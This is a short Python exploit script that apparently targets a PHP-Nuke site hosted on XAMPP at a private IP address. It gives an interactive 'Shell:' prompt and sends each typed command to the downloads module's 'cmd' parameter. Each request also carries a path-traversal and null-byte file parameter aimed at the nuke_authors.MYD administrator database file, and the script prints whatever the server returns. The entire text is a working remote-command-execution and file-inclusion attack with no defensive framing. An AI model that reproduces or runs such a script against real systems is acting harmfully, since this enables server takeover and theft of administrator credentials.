from bs4 import BeautifulSoup
import sys
import requests

host=("192.168.102.181")


while True:
	command=(input("Shell: "))
	url = ("http://"+host+"/phpnuke/modules.php?name=downloads&cmd="+command+"&file=..\..\..\..\..\..\..\\apachefriends\\xampp\mysql\data\\nuke\\nuke_authors.MYD%00")
	response = requests.get(url)
	soup = BeautifulSoup(response.content, "html.parser")
	print(soup)
	
	if command == ("quit"):
		sys.exit()
